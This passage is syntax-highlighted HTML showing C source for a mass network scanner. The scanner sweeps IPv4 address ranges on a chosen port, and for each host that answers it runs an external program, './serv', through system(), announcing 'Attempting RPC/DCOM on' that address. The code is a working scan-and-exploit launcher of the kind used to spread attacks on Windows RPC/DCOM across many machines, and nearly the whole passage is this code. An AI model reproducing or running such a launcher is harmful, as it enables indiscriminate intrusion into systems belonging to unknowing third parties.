</span><span class="sc11">aa</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">aa</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">aa</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">255</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">fatal</span><span class="sc10">(</span><span class="sc6">"Invalid a-range\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">port</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc11">fatal</span><span class="sc10">(</span><span class="sc6">"Bad port number.\n"</span><span class="sc10">);</span><span class="sc0"> 

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">argc</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">bb</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">bb</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bb</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">255</span><span class="sc10">))</span><span class="sc0">
</span><span class="sc11">fatal</span><span class="sc10">(</span><span class="sc6">"Invalid b-range.\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">argc</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">cc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">cc</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">cc</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">255</span><span class="sc10">))</span><span class="sc0">
</span><span class="sc11">fatal</span><span class="sc10">(</span><span class="sc6">"Invalid c-range.\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> 

</span><span class="sc11">init_sockets</span><span class="sc10">();</span><span class="sc0">

</span><span class="sc11">scantime</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">time</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">while</span><span class="sc10">(!</span><span class="sc11">done</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">MAX_SOCKETS</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">dd</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">255</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">cc</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">255</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">cc</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc11">dd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bb</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">255</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">bb</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc11">cc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">dd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">aa</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">255</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">aa</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc11">bb</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">cc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">dd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">ns</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">k</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">MAX_SOCKETS</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">].</span><span class="sc11">status</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc11">S_NONE</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc11">ns</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ns</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">status</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">S_NONE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">ret</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fcntl</span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">F_SETFL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">O_NONBLOCK</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ret</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Unable to set O_NONBLOCK\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">memset</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">ip</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">20</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">ip</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%d.%d.%d.%d"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">aa</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bb</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">cc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dd</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">addr</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">inet_addr</span><span class="sc10">(</span><span class="sc11">ip</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">addr</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc11">fatal</span><span class="sc10">(</span><span class="sc6">"Invalid IP."</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">addr</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">addr</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">port</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">a</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">time</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">status</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">S_CONNECTING</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">dd</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">check_sockets</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">init_sockets</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">MAX_SOCKETS</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">status</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">S_NONE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">memset</span><span class="sc10">((</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">addr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> 
</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">check_sockets</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ret</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">MAX_SOCKETS</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">a</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">time</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">TIMEOUT</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">status</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">S_CONNECTING</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">status</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">S_NONE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">status</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">S_CONNECTING</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">ret</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">connect</span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">addr</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ret</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">errno</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">EISCONN</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"%s\n"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">inet_ntoa</span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">addr</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">),</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc11">time</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">)-</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">a</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">status</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">S_NONE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">errno</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">EALREADY</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">errno</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">EINPROGRESS</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">status</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">S_NONE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">luck</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">luck</span><span class="sc10">,</span><span class="sc6">"./serv %s"</span><span class="sc10">,(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">inet_ntoa</span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">addr</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">),(</span><span class="sc11">time</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">)-</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">a</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Attempting RPC/DCOM on %s\n"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">inet_ntoa</span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">addr</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">),</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc11">time</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">)-</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">a</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">system</span><span class="sc10">(</span><span class="sc11">luck</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Done with %s Next ...\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">status</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">S_NONE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">fatal</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">err</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Error: %s\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">err</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">MAX_SOCKETS</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">status</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">S_CONNECTING</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">connlist</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">exit</span><span class="sc10">(-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
 
</span><span class="sc11"></span><span class="sc0"> 
</span></div></body>
</html>
